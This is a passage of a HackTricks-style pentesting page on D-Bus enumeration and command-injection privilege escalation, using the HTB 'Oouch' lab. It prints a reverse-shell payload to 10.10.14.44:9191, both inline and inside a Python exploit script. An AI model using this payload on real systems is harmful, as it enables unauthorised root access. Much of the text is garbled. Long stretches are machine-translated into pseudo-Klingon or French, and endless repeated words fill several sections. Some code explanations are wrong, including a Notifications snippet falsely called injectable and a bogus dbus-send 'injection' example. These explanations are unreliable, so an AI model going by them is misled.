# D-Bus Enumeration & Command Injection Privilege Escalation

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **GUI enumeration**

D-Bus jatlh Ubuntu desktop environments (IPC) mediator vaj D-Bus. Ubuntu, message buses chel primarily utilized by **privileged services to expose services relevant across the system**, vaj a session bus for each logged-in user, exposing services relevant only to that specific user. The focus here is primarily on the system bus due to its association with services running at higher privileges (e.g., root) as our objective is to elevate privileges. It is noted that D-Bus's architecture employs a 'router' per session bus, which is responsible for redirecting client messages to the appropriate services based on the address specified by the clients for the service they wish to communicate with.

Services on D-Bus are defined by the **objects** and **interfaces** they expose. Objects can be likened to class instances in standard OOP languages, with each instance uniquely identified by an **object path**. This path, akin to a filesystem path, uniquely identifies each object exposed by the service. A key interface for research purposes is the **org.freedesktop.DBus.Introspectable** interface, featuring a singular method, Introspect. This method returns an XML representation of the object's supported methods, signals, and properties, with a focus here on methods while omitting properties and signals.

For communication with the D-Bus interface, two tools were employed: a CLI tool named **gdbus** for easy invocation of methods exposed by D-Bus in scripts, and [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), a Python-based GUI tool designed to enumerate the services available on each bus and to display the objects contained within each service.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


In the first image services registered with the D-Bus system bus are shown, with **org.debin.apt** specifically highlighted after selecting the System Bus button. D-Feet queries this service for objects, displaying interfaces, methods, properties, and signals for chosen objects, seen in the second image. Each method's signature is also detailed.

A notable feature is the display of the service's **process ID (pid)** and **command line**, useful for confirming if the service runs with elevated privileges, important for research relevance.

**D-Feet also allows method invocation**: users can input Python expressions as parameters, which D-Feet converts to D-Bus types before passing to the service.

However, note that **some methods require authentication** before allowing us to invoke them. We will ignore these methods, since our goal is to elevate our privileges without credentials in the first place.

Also note that some of the services query another D-Bus service named org.freedeskto.PolicyKit1 whether a user should be allowed to perform certain actions or not.

## **Cmd line Enumeration**

### List Service Objects

It's possible to list opened D-Bus interfaces with:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### qo'noS

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) jatlhpu' 'ej D-Bus connection 'e' vItlhutlh. D-Bus connection 'e' _unique connection name_ DaH jatlhpu' 'e' bus name. bus name 'oH immutable—'oH guaranteed 'ej vItlhutlh 'e' connection exists—'ej, 'ej, 'oH cha'logh bus lifetime. vaj unique connection name, 'ach vaj connection bus vItlhutlh, vaj 'ach process closes down the connection to the bus 'ej creates a new one. Unique connection names 'oH recognizable because they start with the—otherwise forbidden—colon character.

### Service Object Info

Then, you can obtain some information about the interface with:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### List Interfaces of a Service Object

tlhIngan Hol: 

### QapHa' Duy'wI'pu' jImej

bIquv: 

### bIquvHa' Duy'wI'pu' jImej
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface of a Service Object

Note how in this example it was selected the latest interface discovered using the `tree` parameter (_see previous section_):

### Introspect Interface of a Service Object

Note how in this example it was selected the latest interface discovered using the `tree` parameter (_see previous section_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
### Monitor/Capture Interface

With enough privileges (just `send_destination` and `receive_sender` privileges aren't enough) you can **monitor a D-Bus communication**.

In order to **monitor** a **communication** you will need to be **root.** If you still find problems being root check [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
If you know how to configure a D-Bus config file to **allow non root users to sniff** the communication please **contact me**!
{% endhint %}

Different ways to monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
**DaH jImej** `htb.oouch.Block` **laH** **monitor** **'ej** **"**_**lalalalal**_**"** **ghItlh** **miscommunication** **'e'** **lutlh**.

```bash
dbus-monitor --system "interface='htb.oouch.Block'" | grep --line-buffered "lalalalal" | while read -r line; do echo "$line" | awk '{print $NF}' | xargs -I {} dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.{}; done
```

The `dbus-monitor` command is used to monitor D-Bus messages on the system. In this example, the `--system` flag is used to monitor system-wide messages. The `interface='htb.oouch.Block'` filter is used to only capture messages from the `htb.oouch.Block` interface.

The output of `dbus-monitor` is piped to `grep` to filter for messages containing the string "lalalalal". The `--line-buffered` flag ensures that the output is flushed immediately.

The filtered messages are then processed by the `while` loop. Each line is read and the last field (denoted by `$NF`) is extracted using `awk`. The extracted field is then passed as an argument to `dbus-send`.

The `dbus-send` command is used to send D-Bus messages. In this example, the `--system` flag is used to send the message to the system bus. The `--print-reply` flag is used to print the reply from the recipient. The `--dest=htb.oouch.Block` flag specifies the destination of the message, which is the `htb.oouch.Block` interface. The `/htb/oouch/Block` argument specifies the object path of the interface. The `htb.oouch.Block.{}` argument is replaced with the extracted field from the previous step.

By injecting a malicious command into the message, an attacker can potentially execute arbitrary commands with the privileges of the `htb.oouch.Block` interface.
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
vaj 'ej `monitor` lo'laHbe' 'ej `capture` lo'laHbe' pcap file.

#### qawHaq filtering <a href="#qawHaq_filtering" id="qawHaq_filtering"></a>

vaj 'ejwI' 'e' vItlhutlh. bus, pass a match rule like so:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Multiple rules can be specified. If a message matches _any_ of the rules, the message will be printed. Like so:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) for more information on match rule syntax.

### More

`busctl` has even more options, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

As user **qtc inside the host "oouch" from HTB** you can find an **unexpected D-Bus config file** located in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:

## **Qapla'!**

[**Qapla'!**](http://dbus.freedesktop.org/doc/dbus-specification.html) **D-Bus** documentation vItlhutlh! 

### **Qa'**

`busctl` **vItlhutlh** options, [**vItlhutlh 'ej** **ghItlh** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
ghItlhvam **root** yIn **www-data** user **D-BUS** communication **jImej** **'ej** **'ej** **D-BUS** **ghItlhvam** **'e'** **qtc** **Docker** container **aeb4525789d8** **file** _/code/oouch/routes.py_ **dbus** **code** **'e'** **jImej**:

```python
import dbus

def send_message(message):
    bus = dbus.SystemBus()
    obj = bus.get_object('org.freedesktop.Notifications', '/org/freedesktop/Notifications')
    interface = dbus.Interface(obj, 'org.freedesktop.Notifications')
    interface.Notify('MyApp', 0, '', 'New message', message, '', {}, -1)

def receive_message():
    bus = dbus.SystemBus()
    obj = bus.get_object('org.freedesktop.Notifications', '/org/freedesktop/Notifications')
    interface = dbus.Interface(obj, 'org.freedesktop.Notifications')
    notifications = interface.GetCapabilities()
    return notifications
```

This code uses the `dbus` library to send and receive messages via D-BUS. The `send_message` function sends a message using the `Notify` method of the `org.freedesktop.Notifications` interface. The `receive_message` function retrieves the capabilities of the `org.freedesktop.Notifications` interface using the `GetCapabilities` method.

To exploit this code for privilege escalation, you can inject malicious commands into the `message` parameter of the `send_message` function. Since the code is executed as the `root` or `www-data` user, the injected commands will also be executed with the same privileges.
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
**Qapla'!** QaStaHvIS **D-Bus interface**-lI' **ghItlh** 'ej **"Block" vItlhutlh** "client\_ip" vIlegh.

D-Bus connection **bIQtIqDaq** C compiled binary **D-Bus connection**-Daq **IP address**-lI' **ngogh** 'e' vItlhutlh **`system` function**-vam iptables **block**.\
**`system`-vam vulnerable**-Daj, **command injection**-lI' payload **ghItlh** 'e' vItlhutlh: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### **Qap** vItlhutlh

**D-Bus application**-lI' **C code** **complete**-Daj **'e'**. **'e'**-Daq **D-Bus object path** **'ej interface name** **registered**-Daj. **D-Bus connection**-Daq **information**-lI' **bIQtIqDaq** vItlhutlh:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
DaH jImej 57 vItlhutlh **yInIDmeyDaq D-Bus communication** vItlhutlh **yIghojmeH** 'ej `Block` **ghItlh** (_**vaj 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vIt
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

The following python code will send the payload to the D-Bus connection to the `Block` method via `block_iface.Block(runme)` (_note that it was extracted from the previous chunk of code_):

#### Klingon

**Python**

The following python code will send the payload to the D-Bus connection to the `Block` method via `block_iface.Block(runme)` (_note that it was extracted from the previous chunk of code_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl je dbus-send

busctl est un outil de ligne de commande qui permet d'interagir avec le système de bus D-Bus. Il permet d'envoyer des messages et de recevoir des réponses à partir du bus système ou de bus de session.

dbus-send est un autre outil de ligne de commande qui permet d'envoyer des messages D-Bus. Il peut être utilisé pour envoyer des messages à des objets D-Bus spécifiques en utilisant leur chemin d'objet et leur interface.

#### Enumération des objets D-Bus

Pour énumérer les objets D-Bus disponibles sur le système, vous pouvez utiliser la commande suivante avec busctl :

```bash
busctl tree
```

Cela affichera une arborescence des objets D-Bus disponibles sur le bus système.

#### Injection de commandes avec dbus-send

dbus-send peut également être utilisé pour injecter des commandes dans des objets D-Bus. Pour cela, vous devez spécifier le chemin de l'objet, l'interface et la méthode à utiliser, ainsi que les arguments nécessaires.

Voici un exemple de commande dbus-send qui injecte la commande "ls" dans l'objet D-Bus "/org/gnome/SessionManager/Presence" avec l'interface "org.gnome.SessionManager.Presence" et la méthode "Status":

```bash
dbus-send --session --dest=org.gnome.SessionManager --type=method_call --print-reply /org/gnome/SessionManager/Presence org.gnome.SessionManager.Presence.Status string:"$(ls)"
```

Cela enverra la commande "ls" à l'objet D-Bus spécifié et affichera la réponse.

#### Privilège d'escalade avec l'injection de commandes D-Bus

L'injection de commandes D-Bus peut être utilisée pour escalader les privilèges sur un système. En exploitant une vulnérabilité dans un objet D-Bus, un attaquant peut exécuter des commandes avec les privilèges de l'utilisateur ou du processus associé à cet objet.

Il est important de noter que l'injection de commandes D-Bus nécessite généralement des privilèges d'utilisateur ou de processus spécifiques pour être exploitée avec succès. Par conséquent, cette technique peut être utilisée pour escalader les privilèges à partir d'un point d'accès initial avec des privilèges limités.

